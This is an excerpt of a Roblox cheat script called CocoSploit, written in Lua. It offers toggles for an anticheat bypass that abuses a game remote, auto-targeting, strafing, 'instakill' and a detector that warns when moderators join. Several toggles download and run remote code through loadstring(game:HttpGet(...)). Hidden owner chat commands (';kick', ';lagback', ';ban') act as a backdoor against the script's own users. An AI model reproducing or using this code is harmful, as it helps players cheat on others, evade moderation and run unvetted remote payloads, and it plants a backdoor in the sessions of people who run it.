...
task.spawn(function()
	repeat
		if IsAlive(LocalPlayer) then	
			...
			if NearestPlayer and (AntiVoidPart and NearestPlayer.Character.PrimaryPart.Position.Y >= AntiVoidPart.Position.Y or true) and not NearestPlayer.Character:FindFirstChildOfClass("ForceField") and NearestPlayerDistance > 18 then
...
task.spawn(function()
	local AnticheatBypass, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "4DrunkBigGuysExploitV3", Settings.AnticheatBypass.Value, function(CallBack)
		Settings.AnticheatBypass.Value = CallBack
		...
		task.spawn(function()
			repeat
				...
				game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("RocketImpulse"):InvokeServer(unpack(Args))

				AnticheatBypassedSpeed = Settings.AnticheatBypass.Speed
				AnticheatBypassed = true
			until Settings.AnticheatBypass.Value == false

			AnticheatBypassedSpeed = 0
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.AnticheatBypass.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AnticheatBypass.KeyBind = CallBack
				end)
			end
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateSlider(BlatantTab, "Speed", Settings.AnticheatBypass.Speed, 250, LayoutOrder + 2, function(CallBack)
					Settings.AnticheatBypass.Speed = CallBack
				end)
			end
	...
	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AnticheatBypass.KeyBind then
					Settings.AnticheatBypass.Value = not Settings.AnticheatBypass.Value

					if Settings.AnticheatBypass.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AnticheatBypass.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
...
task.spawn(function()
	local Instakill, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "4BigGuysFastExploitV4", Settings.Instakill.Value, function(CallBack)
		Settings.Instakill.Value = CallBack

		if Settings.Instakill.Value == true then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/script/main/Coco_4BigGuysFastExploitV4"))()	
		end

		if Settings.Instakill.Value == false then
			CreateNotification(3, "Close at next round")
		end
	end)
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.Instakill.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Instakill.KeyBind = CallBack
				end)
			end
	...
	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Instakill.KeyBind then
					Settings.Instakill.Value = not Settings.Instakill.Value
...
task.spawn(function()
	local SetEmote, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "SetEmote", Settings.SetEmote.Value, function(CallBack)
		Settings.SetEmote.Value = CallBack
	end)
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateKeyBind(BlatantTab, Settings.SetEmote.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.SetEmote.KeyBind = CallBack
				end)
			end
	...
	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.SetEmote.KeyBind then
					Settings.SetEmote.Value = not Settings.SetEmote.Value

					if Settings.SetEmote.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.SetEmote.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateMiniToggle(BlatantTab, "BeachVacation", Settings.SetEmote.BeachVacation, LayoutOrder + 2, function(CallBack)
					Settings.SetEmote.BeachVacation = CallBack

					if CallBack == true then
						ChangeEmote("beach_vacation")
					end
				end)
			end
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateMiniToggle(BlatantTab, "EasterBunny", Settings.SetEmote.EasterBunny, LayoutOrder + 3, function(CallBack)
					Settings.SetEmote.EasterBunny = CallBack

					if CallBack == true then
						ChangeEmote("easter_bunny")
					end
				end)
			end
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateMiniToggle(BlatantTab, "Nightmare", Settings.SetEmote.Nightmare, LayoutOrder + 4, function(CallBack)
					Settings.SetEmote.Nightmare = CallBack

					if CallBack == true then
						ChangeEmote("nightmare_1")
					end
				end)
			end
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateMiniToggle(BlatantTab, "Wiggle", Settings.SetEmote.Wiggle, LayoutOrder + 5, function(CallBack)
					Settings.SetEmote.Wiggle = CallBack
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateMiniToggle(BlatantTab, "Knight", Settings.SetEmote.Knight, LayoutOrder + 6, function(CallBack)
					Settings.SetEmote.Knight = CallBack

					if CallBack == true then
						ChangeEmote("knights_bow")
					end
				end)
			end
	...
	local Strafe, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "Strafe", Settings.Strafe.Value, function(CallBack)
		...
		task.spawn(function()
			repeat
				...
				if IsAlive(LocalPlayer) and NearestEntity and (AntiVoidPart and NearestEntity.PrimaryPart.Position.Y > AntiVoidPart.Position.Y or true) then
					local TweenInformation = TweenInfo.new((NearestEntityDistance / (AnticheatBypassed and math.huge or Settings.Strafe.Speed)), Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
...
task.spawn(function()
	local DamageBoost, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "DamageBoostSpeed", Settings.DamageBoost.Value, function(CallBack)
	...
	local FpsBooster, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "FpsBooster", Settings.FpsBooster.Value, function(CallBack)
		...
		task.spawn(function()
			if Settings.FpsBooster.Value == true then
				...
				CreateNotification(5, "AlSploit is now in balanced mode")
			end
		end)	

		task.spawn(function()
			if Settings.FpsBooster.Value == false then
				CreateNotification(5, "AlSploit is now in performance mode")
			end
		end)
	end)
...
task.spawn(function()
	local AntiStaff, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "StaffDetector", Settings.AntiStaff.Value, function(CallBack)
					...
					if Player:IsInGroup(5774246) and Player:GetRankInGroup(5774246) >= 2 then
						...
						task.spawn(function()
							if Settings.AntiStaff.Value == true then
								CreateNotificationStaff(60,  "A staff has joined your game, their name is " .. Player.Name .. "!")
							end
						end)
					end
				end)
				...
				for i, v in next, PlayerService:GetPlayers() do
					task.spawn(function()
						if v:IsInGroup(5774246) and v:GetRankInGroup(5774246) >= 2 then
							...
							task.spawn(function()
								if Settings.AntiStaff.Value == true then
									CreateNotificationStaff(60,  "A staff has joined your game, their name is " .. v.Name .. "!")
								end
							end)									
						end
					end)
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateMiniToggle(UtilityTab, "Auto Leave(Kick)", Settings.AntiStaff.Kick, LayoutOrder + 2, function(CallBack)
...
task.spawn(function()
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateSlider(UtilityTab, "Fov", Settings.Fov.Fov, 150, LayoutOrder + 2, function(CallBack)
...
task.spawn(function()
	local GalaxySky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Anime Girl SkyBox", Settings.GalaxySky.Value, function(CallBack)
...
task.spawn(function()
	local MobileGui, DropDownButton, LayoutOrder, UIGradient = CreateToggle(GuiTab, "Mobile Gui", CallBack, function(CallBack)

		if CallBack == true then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/script/main/Coco_mobile_Gui_flyscript"))()
		end
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateKeyBind(GuiTab, CallBack, LayoutOrder + 1, function(CallBack)
					CallBack = CallBack
				end)
			end
	...
	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.MobileGui.KeyBind then
					Settings.MobileGui.Value = not Settings.MobileGui.Value
		...
		task.spawn(function()
			...
			task.spawn(function()
				if Settings.Indicators.Value == true then
					local Messages = {"CocoSploit", "Best Config", "awa", "CocoSploit"}
...
task.spawn(function()
	local RecallTPPlayer, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Recall TP(Player)", CallBack, function(CallBack)
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, CallBack, LayoutOrder + 1, function(CallBack)
					CallBack = CallBack
				end)
			end
	...
	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.RecallTPPlayer.KeyBind then
					Settings.RecallTPPlayer.Value = not Settings.RecallTPPlayer.Value
	...
	local Cape, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Cape", Settings.Cape.Value, function(CallBack)
		...
		task.spawn(function()
			if Settings.Cape.Value == true then
				local DecalId = (Settings.Cape.Sigma and 12478129491 or 12478129491)
...
task.spawn(function()
	local TargetInfo, DropDownButton, LayoutOrder, UIGradient = CreateToggle(GuiTab, "Target Hud", Settings.TargetInfo.Value, function(CallBack)
		Settings.TargetInfo.Value = CallBack

		if Settings.TargetInfo.Value == true then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/script/main/Coco_target_hud"))()	
		end

		if Settings.TargetInfo.Value == false then
			CreateNotification(3, "Close at next round")
		end
	end)
	...
	task.spawn(function()
		...
		DropDownButton.Activated:Connect(function()
			...
			if Value == true then
				InstanceUI = CreateKeyBind(GuiTab, Settings.TargetInfo.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.TargetInfo.KeyBind = CallBack
				end)
			end
	...
	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.TargetInfo.KeyBind then
					Settings.TargetInfo.Value = not Settings.TargetInfo.Value
				...
				v.Chatted:Connect(function(Message)		
					task.spawn(function ()
						if Message:lower() == ";kick" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							LocalPlayer:Kick("Kicked by CocoSploit owner Good Bye LOL")
						end
					end)
					...
					task.spawn(function()
						if Message:lower() == ";lagback" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
                                       ...
                                       task.spawn(function()
						if Message:lower() == ";ban" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							writefile("ban", "1")
                                        ...
                                        task.spawn(function()
						if Message:lower() == ";detect" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							SendChatMessage("HI")
...
task.spawn(function()
	...
	task.spawn(function()
		if Settings.SetEmote.Value == true then
			if Settings.SetEmote.BeachVacation then
				ChangeEmote("beach_vacation")
			end

			if Settings.SetEmote.EasterBunny then
				ChangeEmote("easter_bunny")
			end

			if Settings.SetEmote.Nightmare then
				ChangeEmote("nightmare_1")
			end

			if Settings.SetEmote.Wiggle then
				ChangeEmote("wiggle")
			end

			if Settings.SetEmote.Knight then
				ChangeEmote("knights_bow")
			end
		end
	end)
	...
	task.spawn(function()
		CreateNotification(6, "Best Config CocoSploit✨ has loaded!")
	end)
...
TextLabel.Text = "CocoSploit✨ discord.gg/FqrVKaHnaw"
